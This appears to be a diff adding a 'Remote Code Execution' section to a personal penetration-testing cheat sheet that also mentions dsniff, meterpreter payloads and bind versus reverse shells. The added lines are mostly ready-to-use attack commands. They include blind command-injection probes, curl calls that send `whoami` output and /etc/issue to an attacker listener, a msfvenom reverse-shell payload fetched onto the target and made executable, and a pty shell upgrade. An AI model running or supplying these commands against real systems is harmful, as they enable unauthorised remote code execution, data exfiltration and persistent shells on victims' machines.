@@ -184,3 +184,20 @@ http://www.monkey.org/~dugsong/dsniff/
 > set payload [...]/meterpreter/[...]
 > bind shell:     process on server waits for connections of attacker
 > reverse shell:  connects back to the attacker -> firewall rule evasion
+
+
+Remote Code Execution:
+------------------
+Blind Remote Code Execution
+> ?cmd=sleep+1
+> capture icmp    // ping+<ip>+-c+5
+> curl http://<ip>:<port>/`whoami`
+> curl http://<ip>:<port>/file -T /etc/issue      // PUT File in HTTP to the attacker listener
+
+> File Upload from attacker machine:
+  > python -m SimpleHTTPServer <port> on attacker machine
+  > msfvenom -p linux/x64/shell_reverse_tcp lhost= lport= -f elf -o data
+  > curl http://<ip>:<port>/data -o /tmp/r
+  > chmod +x [...]
+  > bash -i             // interactive shell
+  > python -c 'import pty;pty.spawn("/bin/bash")'
